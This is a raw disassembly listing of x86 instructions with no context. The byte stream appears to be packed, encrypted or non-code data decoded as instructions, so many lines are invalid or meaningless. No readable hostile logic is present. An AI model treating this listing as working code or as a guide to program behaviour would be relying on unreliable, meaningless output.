  42046b:	fistp  QWORD PTR [esi-0x14]
  42046e:	dec    BYTE PTR [ebx+0x1a59218c]
  420474:	cli    
  420475:	scas   al,BYTE PTR es:[edi]
  420476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420477:	pop    ss
  420478:	out    dx,eax
  420479:	mov    dl,0xaf
  42047b:	es stc 
  42047d:	adc    bl,BYTE PTR [eax-0x381dd916]
  420483:	adc    edx,esi
  420485:	sar    BYTE PTR [edi],0x3b
  420488:	cmp    esp,DWORD PTR [esp]
  42048b:	inc    edx
  42048c:	jl     0x42044e
  42048e:	xchg   ebx,eax
  42048f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420490:	sbb    al,0x7
  420492:	popa   
  420493:	fwait
  420494:	mov    DWORD PTR [eax+edx*8-0x4e],esi
  420498:	inc    ebp
  420499:	clc    
  42049a:	push   edx
  42049b:	mov    BYTE PTR [edi],cl
  42049d:	pop    edx
  42049e:	fnop   
  4204a0:	xor    eax,0xe4740d9f
  4204a5:	xchg   esi,eax
  4204a6:	push   esi
  4204a7:	mov    edx,0xb9bf4e05
  4204ac:	outs   dx,BYTE PTR cs:[esi]
  4204ae:	mov    cl,0xf
  4204b0:	ds pop ecx
  4204b2:	fiadd  WORD PTR [ecx-0x4b]
  4204b5:	loop   0x42043d
  4204b7:	push   esp
  4204b8:	lods   eax,DWORD PTR ds:[esi]
  4204b9:	js     0x420449
  4204bb:	sbb    edx,esp
  4204bd:	or     bh,BYTE PTR [edx+eax*8]
  4204c0:	fld    TBYTE PTR [ecx]
  4204c2:	retf   
  4204c3:	(bad)  
  4204c4:	jecxz  0x420534
  4204c6:	iret   
  4204c7:	jl     0x4204c8
  4204c9:	iret   
  4204ca:	aas    
  4204cb:	lea    ecx,[ebx-0x8]
  4204ce:	ror    DWORD PTR [esi],1
  4204d0:	(bad)  
  4204d1:	mov    al,0x4d
  4204d3:	fsub   DWORD PTR [ebx+0x32]
  4204d6:	test   al,0xef
  4204d8:	cmp    eax,0xf4c225c2
  4204dd:	popa   
  4204de:	int3   
  4204df:	cmp    BYTE PTR [ecx-0x797dc4ec],0x3f
  4204e6:	jle    0x42047f
  4204e8:	xor    al,0xd8
  4204ea:	fisubr DWORD PTR [ecx]
  4204ec:	sahf   
  4204ed:	shr    edx,cl
  4204ef:	sub    DWORD PTR [esi+0x48aada0],ecx
  4204f5:	ds and al,0x13
  4204f8:	gs addr16 out 0x6d,al
  4204fc:	add    al,0xdd
  4204fe:	lahf   
  4204ff:	xor    eax,0xaf396a3e
  420504:	and    BYTE PTR [esi+0x6faa9626],bl
  42050a:	fisub  WORD PTR [esi]
  42050c:	mov    ch,0x6
  42050e:	xor    ebx,ecx
  420510:	mov    esi,0xcf24ad78
  420515:	fstp   TBYTE PTR [eax-0x32907e73]
  42051b:	rcr    BYTE PTR [edx+0x46],0x82
  42051f:	fwait
  420520:	loope  0x42057c
  420522:	cmp    al,0xe6
  420524:	stos   DWORD PTR es:[edi],eax
  420525:	das    
  420526:	add    DWORD PTR [esi+0x67],0xffffffd6
  42052a:	add    bh,BYTE PTR [ebx-0x72]
  42052d:	js     0x42054d
  42052f:	pushf  
  420530:	xor    ebx,DWORD PTR [ecx+0x111b0c49]
  420536:	dec    ecx
  420537:	mov    edx,0x6dfc5913
  42053c:	std    
  42053d:	das    
  42053e:	das    
  42053f:	idiv   DWORD PTR [edi-0x1e12c432]
  420545:	repz ret 
  420547:	pop    esp
  420548:	cld    
  420549:	sbb    al,0x53
  42054b:	ins    BYTE PTR es:[edi],dx
  42054c:	and    al,0xf
  42054e:	cmp    eax,0x3a6c60cb
  420553:	sub    al,0x23
  420555:	sub    al,BYTE PTR [ebx]
  420557:	dec    edx
  420558:	sbb    DWORD PTR [edx+0x10],esp
  42055b:	xor    DWORD PTR [ebx+eax*1+0x6a],0x25192c9c
  420563:	pop    edx
  420564:	sbb    eax,0x455b28e2
  420569:	dec    esi
  42056a:	sub    ah,BYTE PTR [edi]
  42056c:	pop    edx
  42056d:	mov    edi,0xd4f0b612
  420572:	push   es
  420573:	outs   dx,BYTE PTR ds:[esi]
  420574:	dec    ecx
  420575:	hlt    
  420576:	cmp    eax,0x2f9019d9
  42057b:	imul   ecx,DWORD PTR [edx+0x33],0xc9c69166
  420582:	dec    esi
  420583:	xchg   edi,eax
  420584:	test   BYTE PTR [eax*4+0x655867ec],cl
  42058b:	add    eax,0x154d26b0
  420590:	mov    ah,0xd0
  420592:	stos   BYTE PTR es:[edi],al
  420593:	gs and dh,ch
  420596:	scas   al,BYTE PTR es:[edi]
  420597:	cmp    eax,0x8fb9748
  42059c:	push   ebp
  42059d:	sahf   
  42059e:	sti    
  42059f:	neg    DWORD PTR [edx+ebx*4]
  4205a2:	or     esp,DWORD PTR [eax-0x10bdc87f]
  4205a8:	xor    bh,BYTE PTR [ebx]
  4205aa:	cmp    cl,ah
  4205ac:	cs dec ebx
  4205ae:	xchg   ecx,eax
  4205af:	cmp    al,0x52
  4205b1:	mov    dh,0x50
  4205b3:	add    DWORD PTR [eax-0x6c],esi
  4205b6:	push   ebx
  4205b7:	gs push ss
  4205b9:	inc    edx
  4205ba:	enter  0x6b99,0x93
  4205be:	and    esp,DWORD PTR [edx]
  4205c0:	mov    ch,0x41
  4205c2:	cld    
  4205c3:	(bad)  
  4205c4:	repz jmp 0xaffc:0xcb17c2d5
  4205cc:	xchg   edi,eax
  4205cd:	cld    
  4205ce:	cmc    
  4205cf:	mov    cs,esp
  4205d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d2:	mov    eax,0x99edd3e5
  4205d7:	mov    eax,ds:0xde8fae7f
  4205dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205dd:	repnz push esp
  4205df:	cdq    
  4205e0:	repz aas 
  4205e2:	loope  0x4205c9
  4205e4:	jbe    0x4205fd
  4205e6:	out    dx,al
  4205e7:	sub    BYTE PTR [edi],bl
  4205e9:	sub    ebp,DWORD PTR [ebp+0x65]
  4205ec:	push   cs
  4205ed:	jno    0x42058f
  4205ef:	mov    ds:0x19573aaf,al
  4205f4:	xor    eax,0x9172f4c6
  4205f9:	mov    ebp,0xf916b50f
  4205fe:	(bad)  [ebp+0x2b665754]
  420604:	repnz lods al,BYTE PTR ds:[esi]
  420606:	inc    esi
  420607:	mov    ebx,0x52e2b7cf
  42060c:	mov    ds:0xcadd2836,al
  420611:	dec    ebp
  420612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420613:	imul   esp,DWORD PTR [esi+0x74],0x1e
  420617:	push   cs
  420618:	lods   eax,DWORD PTR ds:[esi]
  420619:	inc    edi
  42061a:	push   ecx
  42061b:	(bad)  
  42061c:	or     DWORD PTR [eax],ecx
  42061e:	pop    eax
  42061f:	fild   WORD PTR [esi-0x11]
  420622:	mov    ch,BYTE PTR [ebx]
  420624:	sub    ebp,DWORD PTR [eax]
  420626:	push   cs
  420627:	js     0x4205f5
  420629:	ret    0xa205
  42062c:	imul   ebx,DWORD PTR [ebp-0x25b087ba],0x79e64af6
  420636:	mov    ch,0xde
  420638:	js     0x42062c
  42063a:	ins    DWORD PTR es:[edi],dx
  42063b:	shl    dl,0xbe
  42063e:	mov    DWORD PTR [edx+0x56],edi
  420641:	inc    edi
  420642:	iret   
  420643:	jbe    0x420616
  420645:	dec    esi
  420646:	retf   
  420647:	and    ch,BYTE PTR [eax-0x58418560]
  42064d:	xor    DWORD PTR [edx],esi
  42064f:	rcr    BYTE PTR [esp+ecx*8-0x34eb223b],cl
  420656:	hlt    
  420657:	mov    dl,0x8c
  420659:	dec    edi
  42065a:	sub    ebx,ebx
  42065c:	mov    ah,dl
  42065e:	sbb    ebp,DWORD PTR [ecx]
  420660:	ins    BYTE PTR es:[edi],dx
  420661:	cld    
  420662:	jnp    0x42068a
  420664:	test   BYTE PTR [ecx],cl
  420666:	xor    eax,0xe2de7acb
  42066b:	add    ebx,DWORD PTR [esi-0x5a]
  42066e:	xor    esp,edx
  420670:	or     cl,BYTE PTR [edx-0x3c7095e1]
  420676:	mov    BYTE PTR [edi],al
  420678:	dec    ebx
  420679:	xor    ch,bl
  42067b:	pop    ebx
  42067c:	pop    eax
  42067d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42067e:	sub    al,0xc9
  420680:	xchg   esi,eax
  420681:	mov    eax,ds:0x11ec17f0
  420686:	pop    ecx
  420687:	loope  0x42069b
  420689:	inc    esi
  42068a:	sbb    cl,al
  42068c:	lods   eax,DWORD PTR ds:[esi]
  42068d:	ins    BYTE PTR es:[edi],dx
  42068e:	call   0x4b51f226
  420693:	inc    ebx
  420694:	mov    al,ds:0xea813414
  420699:	sar    BYTE PTR [edx],0x38
  42069c:	fwait
  42069d:	popf   
  42069e:	adc    DWORD PTR [esi],edx
  4206a0:	ins    DWORD PTR es:[edi],dx
  4206a1:	fisttp WORD PTR [ebp+esi*4+0x3c8e41fc]
  4206a8:	cld    
  4206a9:	xlat   BYTE PTR ds:[ebx]
  4206aa:	ret    
  4206ab:	leave  
  4206ac:	cmp    ch,BYTE PTR fs:[ebx+0x17]
  4206b0:	xor    DWORD PTR [edx+0x34274a9a],edi
  4206b6:	(bad)  
  4206b7:	out    0x8b,eax
  4206b9:	lahf   
  4206ba:	cmp    dh,cl
  4206bc:	cmp    ecx,ebp
  4206be:	jmp    0x420644
  4206c0:	mov    esi,DWORD PTR [edi-0x18e5d910]
  4206c6:	gs sub al,ch
  4206c9:	(bad)  
  4206ca:	mov    esp,0xf1b4480d
  4206cf:	out    0xba,al
  4206d1:	cmp    DWORD PTR [edi+ecx*1+0x2c],0x11
  4206d6:	loopne 0x420718
  4206d8:	mov    ?,WORD PTR [eax-0x1e]
  4206db:	jle    0x420686
  4206dd:	inc    ebx
  4206de:	jne    0x42071d
  4206e0:	pop    ecx
  4206e1:	ds mov eax,0x1d312b09
  4206e7:	lahf   
  4206e8:	sar    BYTE PTR [esi+ecx*2-0x6f569c0f],0x23
  4206f0:	xchg   ebp,eax
  4206f1:	adc    bl,BYTE PTR [eax-0x55]
  4206f4:	outs   dx,BYTE PTR ds:[esi]
  4206f5:	int3   
  4206f6:	cwde   
  4206f7:	xor    al,0xc7
  4206f9:	retf   0x83bf
  4206fc:	and    al,0x26
  4206fe:	adc    al,0x0
  420700:	or     eax,0xbfe4bf84
  420705:	adc    DWORD PTR [ebp+0x59],0xfffffffe
  420709:	cmp    BYTE PTR [eax-0xf],bh
  42070c:	jle    0x4206ef
  42070e:	xchg   esi,eax
  42070f:	test   DWORD PTR [edi],esi
  420711:	ja     0x4206e6
  420713:	xor    bl,BYTE PTR [edi+0x475bc33a]
  420719:	shl    BYTE PTR [ecx-0x27],0x74
  42071d:	dec    edi
  42071e:	push   eax
  42071f:	jp     0x42079b
  420721:	sub    dl,dh
  420723:	and    bl,BYTE PTR [ecx+0x62392a24]
  420729:	add    eax,0xddc3a67f
  42072e:	adc    cl,bh
  420730:	jecxz  0x420738
  420732:	cmp    al,0xc4
  420734:	inc    ebx
  420735:	stos   BYTE PTR es:[edi],al
  420736:	sar    BYTE PTR [ecx],0xd
  420739:	out    0xd3,al
  42073b:	mov    dh,0xc1
  42073d:	cmp    dl,BYTE PTR [ebx+0x7b3f3cb3]
  420743:	jnp    0x420714
  420745:	xchg   esi,eax
  420746:	add    ah,BYTE PTR [ebx+0x10124ea6]
  42074c:	add    esp,DWORD PTR [esi+eiz*1-0x4f]
  420750:	aam    0xf1
  420752:	xor    al,0x47
  420754:	sbb    esi,DWORD PTR [ecx]
  420756:	call   0x95b2a3b3
  42075b:	pop    ecx
  42075c:	call   0x53a2:0x6adf4500
  420763:	adc    eax,0x210eba62
  420768:	or     BYTE PTR [esi],0x6d
  42076b:	call   DWORD PTR [edi-0x66]
  42076e:	xchg   BYTE PTR [edx-0x142a5139],bl
  420774:	ror    BYTE PTR [esi-0xda80bf4],cl
  42077a:	js     0x4207bc
  42077c:	in     al,dx
  42077d:	pop    ds
  42077e:	aaa    
  42077f:	inc    esp
  420780:	xchg   ebx,eax
  420781:	aaa    
  420782:	jp     0x4207ad
  420784:	jne    0x420772
  420786:	or     edx,DWORD PTR [ebp+0x4e]
  420789:	fwait
  42078a:	push   edi
  42078b:	add    eax,0x4148aeeb
  420790:	repz pop es
  420792:	xchg   edi,eax
  420793:	jb     0x4207cf
  420795:	xor    al,0x14
  420797:	adc    al,0xc6
  420799:	(bad)  
  42079a:	and    al,0x3d
  42079c:	mov    al,ds:0xcb769d3b
  4207a1:	in     eax,dx
  4207a2:	or     DWORD PTR [ecx],0xfacc138
  4207a8:	adc    al,0x37
  4207aa:	pop    es
  4207ab:	std    
  4207ac:	xor    edx,esi
  4207ae:	xchg   esi,eax
  4207af:	mov    edi,0x939dbc30
  4207b4:	sbb    BYTE PTR [esi],ah
  4207b6:	xor    bh,ah
  4207b8:	out    dx,eax
  4207b9:	shl    BYTE PTR [edi-0x80],1
  4207bc:	pop    ecx
  4207bd:	je     0x4207a2
  4207bf:	inc    eax
  4207c0:	pop    ebx
  4207c1:	pop    ds
  4207c2:	or     DWORD PTR [edx+0x7c5b2e12],ecx
  4207c8:	(bad)  
  4207c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ca:	ins    BYTE PTR es:[edi],dx
  4207cb:	pop    edi
  4207cc:	scas   eax,DWORD PTR es:[edi]
  4207cd:	enter  0x4977,0x82
  4207d1:	test   al,0x92
  4207d3:	add    al,0xb6
  4207d5:	fistp  QWORD PTR [esp+edi*2-0x721d4869]
  4207dc:	setl   BYTE PTR [edi+0x5a9d88ea]
  4207e3:	aam    0xd7
  4207e5:	popf   
  4207e6:	dec    esp
  4207e7:	mov    eax,0x4ac8a720
  4207ec:	(bad)  
  4207ed:	retf   
  4207ee:	les    edx,FWORD PTR [edi+0x6eb6c65f]
  4207f4:	test   al,0xcc
  4207f6:	fisttp WORD PTR [edi+0x70c7e1a5]
  4207fc:	addr16 cdq 
  4207fe:	aad    0xb1
  420800:	daa    
  420801:	in     eax,0xb1
  420803:	sahf   
  420804:	add    DWORD PTR [edi],esp
  420806:	out    dx,eax
  420807:	dec    ecx
  420808:	or     eax,0xc38d78d0
  42080d:	sbb    BYTE PTR [eax+ebp*4],ch
  420810:	mov    ah,0x5a
  420812:	mov    bh,BYTE PTR [ebx]
  420814:	sar    DWORD PTR [esi],cl
  420816:	out    0x24,eax
  420818:	aam    0xc4
  42081a:	stos   BYTE PTR es:[edi],al
  42081b:	cld    
  42081c:	add    al,0x9d
  42081e:	jae    0x420844
  420820:	xchg   ebx,eax
  420821:	stc    
  420822:	aad    0x79
  420824:	push   ss
  420825:	clc    
  420826:	mov    bl,0xdb
  420828:	push   ebp
  420829:	dec    esp
  42082a:	aaa    
  42082b:	adc    ebp,ecx
  42082d:	ret    0xf0bf
  420830:	mov    ch,BYTE PTR [ecx+0x79]
  420833:	push   0x2
  420835:	xor    DWORD PTR [edx-0x60449c12],ebx
  42083b:	lds    edx,FWORD PTR [esi-0x10]
  42083e:	mov    eax,0x9201ad21
  420843:	or     al,0x1c
  420845:	repnz fist DWORD PTR [esi-0x1b]
  420849:	aas    
  42084a:	std    
  42084b:	jle    0x420886
  42084d:	lods   eax,DWORD PTR ds:[esi]
  42084e:	dec    eax
  42084f:	jmp    0x4207d6
  420851:	cmc    
  420852:	mov    cl,ah
  420854:	pop    eax
  420855:	bound  ebx,QWORD PTR [ebx]
  420857:	jae    0x4208b8
  420859:	sub    ah,BYTE PTR [ecx-0x7f]
  42085c:	xchg   esi,eax
  42085d:	mov    ah,0x5e
  42085f:	iret   
  420860:	xor    DWORD PTR ds:0x9d569e71,ecx
  420866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420867:	add    edx,DWORD PTR [edx-0x496e5af0]
  42086d:	and    al,0xff
  42086f:	enter  0xd117,0x13
  420873:	add    al,0xe2
  420875:	or     ch,cl
  420877:	stos   BYTE PTR es:[edi],al
  420878:	pop    edi
  420879:	out    dx,al
  42087a:	ror    DWORD PTR [edx],1
  42087c:	lods   eax,DWORD PTR ds:[esi]
  42087d:	daa    
  42087e:	jae    0x4208c8
  420880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420881:	sub    edi,edi
  420883:	ficomp WORD PTR [eax+eax*8+0x4ed8f499]
  42088a:	fadd   DWORD PTR [esi]
  42088c:	adc    eax,0xc5e90a53
  420891:	mov    bl,0x0
  420893:	sbb    al,0x58
  420895:	or     al,0x91
  420897:	mov    BYTE PTR [edi],bl
  420899:	mov    al,ds:0xd2ec3156
  42089e:	icebp  
  42089f:	sub    DWORD PTR ds:0x178351b4,esi
  4208a5:	leave  
  4208a6:	fisub  DWORD PTR [edx+0x7a]
  4208a9:	mov    cl,0xa9
  4208ab:	and    BYTE PTR [edi-0x49],cl
  4208ae:	enter  0x8220,0x77
  4208b2:	ja     0x42090f
  4208b4:	or     al,0xc0
  4208b6:	cs xor ebx,eax
  4208b9:	jns    0x420936
  4208bb:	and    ch,BYTE PTR [edi+0x3e7e5203]
  4208c1:	add    ebp,DWORD PTR [esi+0x33]
  4208c4:	(bad)  
  4208c5:	test   DWORD PTR [ebp+0x8],edx
  4208c8:	push   ss
  4208c9:	in     eax,0xc7
  4208cb:	jmp    0x4208e0
  4208cd:	std    
  4208ce:	in     eax,dx
  4208cf:	xchg   ebx,eax
  4208d0:	jb     0x420892
  4208d2:	rcr    DWORD PTR ds:0x3c449fcb,cl
  4208d8:	ret    0xcff9
  4208db:	in     al,0xbb
  4208dd:	xchg   ebx,eax
  4208de:	mov    eax,ds:0xca2f9987
  4208e3:	dec    esi
  4208e4:	jnp    0x42094c
  4208e6:	ja     0x420965
  4208e8:	ret    
  4208e9:	mov    ch,0xde
  4208eb:	lock push esi
  4208ed:	out    0x2c,eax
  4208ef:	lea    edi,ds:0x34b00938
  4208f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f6:	inc    esp
  4208f7:	xchg   edi,edi
  4208f9:	push   edi
  4208fa:	daa    
  4208fb:	jb     0x4208d4
  4208fd:	sti    
  4208fe:	pop    esi
  4208ff:	mov    edi,0xe143ae87
  420904:	scas   eax,DWORD PTR es:[edi]
  420905:	(bad)  
  420906:	cmp    al,0x99
  420908:	mov    ah,BYTE PTR [edi]
  42090a:	sub    al,0x62
  42090c:	jbe    0x4208e8
  42090e:	dec    edx
  42090f:	and    eax,0x2c9ab9d7
  420914:	xchg   edi,eax
  420915:	and    bh,BYTE PTR [ebx+ebp*4+0x3e]
  420919:	das    
  42091a:	jl     0x4208f7
  42091c:	arpl   WORD PTR [esi-0xdb4ecd0],ax
  420922:	sbb    eax,0xd704ac0
  420927:	retf   0xa529
  42092a:	repz sub al,0x50
  42092d:	pop    ebx
  42092e:	shl    BYTE PTR [ebp-0x5ca8017b],0x38
  420935:	push   es
  420936:	pop    eax
  420937:	retf   
  420938:	mov    esi,0x1969ab8b
  42093d:	add    BYTE PTR [ebx],ch
  42093f:	inc    ecx
  420940:	ror    DWORD PTR [edx+eiz*4-0xe],1
  420944:	arpl   WORD PTR [eax],ax
  420946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420947:	sbb    dl,ch
  420949:	sbb    eax,DWORD PTR [ebx+eiz*1-0x3]
  42094d:	pop    ss
  42094e:	mov    edx,0x2ecbede
  420953:	xor    ecx,DWORD PTR [eax+0x4f]
  420956:	(bad)  
  420957:	packuswb mm4,QWORD PTR [edi+0x7b]
  42095b:	inc    esp
  42095c:	out    dx,al
  42095d:	ds (bad) 
  42095f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420960:	adc    DWORD PTR [ecx-0x26e2be0a],ebp
  420966:	loop   0x4209bb
  420968:	xor    BYTE PTR [ecx+0x5f8fc5ab],0x2e
  42096f:	add    eax,0x30b1d5e3
  420974:	inc    edi
  420975:	jecxz  0x4209a3
  420977:	repnz popa 
  420979:	push   0x180cdb74
  42097e:	xor    eax,0xf7545662
  420983:	hlt    
  420984:	mov    ds:0x6e20ef16,eax
  420989:	adc    ecx,eax
  42098b:	sbb    eax,0x391ebf55
  420990:	(bad)  
  420991:	(bad)
  420994:	das    
  420995:	mov    ah,0x46
  420997:	push   esp
  420998:	sbb    al,0x5a
  42099a:	mov    ah,BYTE PTR [ebx+0x304d7cf]
  4209a0:	sub    DWORD PTR [edx+ecx*2],edi
  4209a3:	xchg   ebp,eax
  4209a4:	add    DWORD PTR [ebx-0x6c012455],eax
  4209aa:	lea    edx,[edi]
  4209ac:	pop    ss
  4209ad:	push   0xe3638e78
  4209b2:	je     0x420938
  4209b4:	push   ss
  4209b5:	(bad)  
  4209b7:	gs mov al,0xe7
  4209ba:	or     ebx,DWORD PTR [edx+0x6e]
  4209bd:	aad    0x36
  4209bf:	ror    DWORD PTR [edx-0x1d6bb093],cl
  4209c5:	jge    0x4209a9
  4209c7:	fadd   DWORD PTR [esi-0x35]
  4209ca:	sbb    bh,BYTE PTR [edx]
  4209cc:	push   edx
  4209cd:	jo     0x420959
  4209cf:	mov    ch,BYTE PTR [ebx-0x264a06ac]
  4209d5:	mov    esp,0xc7cfc827
  4209da:	add    BYTE PTR [ebp-0x7b52d585],bl
  4209e0:	or     DWORD PTR [eax],edx
  4209e2:	inc    ecx
  4209e3:	ss ins DWORD PTR es:[edi],dx
  4209e5:	pusha  
  4209e6:	mov    esi,0x324918c4
  4209eb:	lahf   
  4209ec:	fbld   TBYTE PTR [ebx+0x2dea4a04]
  4209f2:	xchg   edi,eax
  4209f3:	cmp    al,0xd8
  4209f5:	not    esi
  4209f7:	adc    edi,DWORD PTR [ebx+0x6b]
  4209fa:	push   0x14
  4209fc:	imul   esi,eax,0xdb31679a
  420a02:	lods   al,BYTE PTR ds:[esi]
  420a03:	ret    
  420a04:	outs   dx,DWORD PTR ds:[esi]
  420a05:	out    dx,eax
  420a06:	fwait
  420a07:	rcr    esp,1
  420a09:	lds    ebx,FWORD PTR [edi+0x49]
  420a0c:	stos   DWORD PTR es:[edi],eax
  420a0d:	sub    DWORD PTR [edi+0x47],edi
  420a10:	lock push esp
  420a12:	lea    ebp,[eax-0x1]
  420a15:	cmp    ebp,DWORD PTR [ecx-0x3d]
  420a18:	pop    ebx
  420a19:	xor    DWORD PTR [edi],0xffffff81
  420a1c:	(bad)
  420a1f:	add    DWORD PTR [eax],ebx
  420a21:	or     edx,ecx
  420a23:	jp     0x420a89
  420a25:	mov    esp,0x756ad734
  420a2a:	cmp    DWORD PTR [ebx],ebp
  420a2c:	mov    ebp,0xc3427291
  420a31:	cmp    eax,0xbaba4d38
  420a36:	int3   
  420a37:	mov    ebp,0x3cd56623
  420a3c:	or     edx,DWORD PTR [esi+0x6c]
  420a3f:	jns    0x420a20
  420a41:	mov    esp,0x274b0dbc
  420a46:	loopne 0x420a3f
  420a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a49:	and    al,0xf6
  420a4b:	mov    ebx,0xdcac3188
  420a50:	and    dh,bh
  420a52:	(bad)  
  420a53:	aas    
  420a54:	jl     0x420a74
  420a56:	push   0xfffffff4
  420a58:	inc    eax
  420a59:	cdq    
  420a5a:	stc    
  420a5b:	adc    ah,BYTE PTR ss:[ecx]
  420a5e:	repnz pop ebp
  420a60:	pop    ss
  420a61:	xor    al,0xd9
  420a63:	fistp  QWORD PTR [edi+0x2e]
  420a66:	pop    edx
  420a67:	xchg   DWORD PTR [edi+0x24b05a40],ebp
  420a6d:	out    0xc9,eax
  420a6f:	xchg   esp,eax
  420a70:	push   0xf
  420a72:	in     eax,dx
  420a73:	jbe    0x420a4b
  420a75:	mov    edx,0x7890d711
  420a7a:	cmp    BYTE PTR [esp+eiz*2],bh
  420a7d:	les    ecx,FWORD PTR [ebx+esi*2-0x44]
  420a81:	add    BYTE PTR [edi+edx*1-0x2c],bl
  420a85:	sbb    DWORD PTR [esi+ebp*1-0x305ee547],ecx
  420a8c:	dec    esi
  420a8d:	mov    ebx,0x57638b7f
  420a92:	sub    al,0xe7
  420a94:	add    DWORD PTR [eax],ebx
  420a96:	ins    DWORD PTR es:[edi],dx
  420a97:	int    0xcb
  420a99:	xchg   BYTE PTR [ebp+0x26cb9daf],bh
  420a9f:	call   0x1f1d4e85
  420aa4:	push   edx
  420aa5:	adc    al,0x21
  420aa7:	sbb    ebp,DWORD PTR [esi+0x2e373f80]
  420aad:	xchg   DWORD PTR [edx+esi*4+0x2a159172],esi
  420ab4:	outs   dx,DWORD PTR gs:[esi]
  420ab6:	aaa    
  420ab7:	jb     0x420b18
  420ab9:	xor    ah,BYTE PTR [eax-0x6]
  420abc:	into   
  420abd:	idiv   ebx
  420abf:	pop    edi
  420ac0:	addr16 pushf 
  420ac2:	je     0x420b1e
  420ac4:	dec    esi
  420ac5:	jae    0x420afb
  420ac7:	inc    ecx
  420ac8:	jmp    0x420abe
  420aca:	mov    cl,0xf5
  420acc:	sahf   
  420acd:	cdq    
  420ace:	xchg   edx,eax
  420ad0:	out    0x74,eax
  420ad2:	ret    0xafa5
  420ad5:	sbb    al,0x9b
  420ad7:	xchg   ecx,eax
  420ad8:	push   eax
  420ad9:	mov    ah,ah
  420adb:	mov    ebx,DWORD PTR [ebx]
  420add:	mov    ebx,DWORD PTR [eax+0x38]
  420ae0:	lock fistp WORD PTR ds:0x7dfccd14
  420ae7:	jecxz  0x420aca
  420ae9:	shl    DWORD PTR [ebx-0x43],cl
  420aec:	inc    eax
  420aed:	pop    esi
  420aee:	fwait
  420aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af0:	jnp    0x420b59
  420af2:	lods   al,BYTE PTR ds:[esi]
  420af3:	xchg   edx,eax
  420af4:	add    eax,0xfc5a2b5a
  420af9:	mov    ebx,0x33b0e887
  420afe:	jp     0x420aaf
  420b00:	adc    esi,DWORD PTR [ebp-0x7067285b]
  420b06:	push   0xfa34d96
  420b0b:	or     BYTE PTR [ecx-0x3a],0xd2
  420b0f:	adc    esp,DWORD PTR [eax-0x12f96991]
  420b15:	clc    
  420b16:	push   eax
  420b17:	add    BYTE PTR [ebp-0x15],0xa0
  420b1b:	dec    eax
  420b1c:	sub    eax,0x8977ba21
  420b21:	sub    BYTE PTR [edi],ch
  420b23:	(bad)  
  420b24:	lea    esi,[eax+ecx*2+0x68]
  420b28:	sub    BYTE PTR [eax+eax*8-0x35],dh
  420b2c:	or     DWORD PTR [esi+ebp*8-0x66],ebp
  420b30:	dec    eax
  420b31:	dec    ecx
  420b32:	iret   
  420b33:	scas   al,BYTE PTR es:[edi]
  420b34:	in     eax,dx
  420b35:	enter  0xf29c,0x52
  420b39:	je     0x420b10
  420b3b:	imul   ecx
  420b3d:	ror    BYTE PTR [ebp+0x2e7552b8],1
  420b43:	or     bl,cl
  420b45:	pop    eax
  420b46:	mov    dl,BYTE PTR [edi]
  420b48:	fs std 
  420b4a:	bound  edi,QWORD PTR [edi-0x7c]
  420b4d:	out    dx,eax
  420b4e:	mul    BYTE PTR [esi+0x11a6a7f3]
  420b54:	sahf   
  420b55:	dec    ecx
  420b56:	ins    DWORD PTR es:[edi],dx
  420b57:	jns    0x420b35
  420b59:	test   DWORD PTR [ecx],ebx
  420b5b:	sti    
  420b5c:	out    dx,al
  420b5d:	cmp    BYTE PTR [ebp-0x14],al
  420b60:	mov    BYTE PTR [eax-0x6],0x43
  420b64:	mov    edx,0x5d34cfac
  420b69:	cmp    eax,0x1d8ad369
  420b6e:	and    esi,DWORD PTR [eax]
  420b70:	pop    esp
  420b71:	or     eax,0x702fd7c1
  420b76:	test   al,0x71
  420b78:	and    eax,0x87a8db07
  420b7d:	ret    
  420b7e:	xor    eax,0x49d1654f
  420b83:	pop    ds
  420b84:	mov    esi,0x3fcabe9e
  420b89:	sar    BYTE PTR [di],cl
  420b8c:	xlat   BYTE PTR ds:[ebx]
  420b8d:	push   ebx
  420b8e:	repnz repnz mov DWORD PTR [ecx+0x64d7d5dc],esp
  420b96:	lahf   
  420b97:	stc    
  420b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b99:	mov    WORD PTR [esi+0x45],ss
  420b9c:	sbb    edi,DWORD PTR [ecx+0x7c]
  420b9f:	xchg   ebx,eax
  420ba0:	xchg   esi,eax
  420ba1:	pop    ebx
  420ba2:	fimul  DWORD PTR [ecx+ebp*1]
  420ba5:	test   BYTE PTR [ebp-0x5424408b],cl
  420bab:	fiadd  WORD PTR [edx+0x16]
  420bae:	imul   ebp,DWORD PTR [ecx+0xd1407bb],0x38343e40
  420bb8:	push   ebp
  420bb9:	fxch   st(5)
  420bbb:	mov    DWORD PTR [edi],0x30d77e19
  420bc1:	adc    al,0x39
  420bc3:	je     0x420c1c
  420bc5:	cli    
  420bc6:	mov    dl,0x7f
  420bc8:	add    eax,0x9f1d5ef4
  420bcd:	or     al,0xbc
  420bcf:	sar    BYTE PTR [eax-0x54],0x18
  420bd3:	add    al,0x33
  420bd5:	mov    bl,0x31
  420bd7:	into   
  420bd8:	cmp    ebx,DWORD PTR [eax+ebp*4+0x2]
  420bdc:	dec    esi
  420bdd:	xchg   ecx,eax
  420bde:	popa   
  420bdf:	dec    esp
  420be0:	dec    edi
  420be1:	xchg   al,dl
  420be3:	pop    es
  420be4:	stos   BYTE PTR es:[edi],al
  420be5:	xchg   edi,eax
  420be6:	sbb    al,0x6d
  420be8:	mov    ecx,0xa4b3e6cb
  420bed:	cmp    DWORD PTR [ecx+0x3a1bdf90],0xffffffba
  420bf4:	pop    esi
  420bf5:	sub    al,ch
  420bf7:	cmc    
  420bf8:	(bad)  
  420bf9:	lahf   
  420bfa:	in     eax,0x8c
  420bfc:	jae    0x420c02
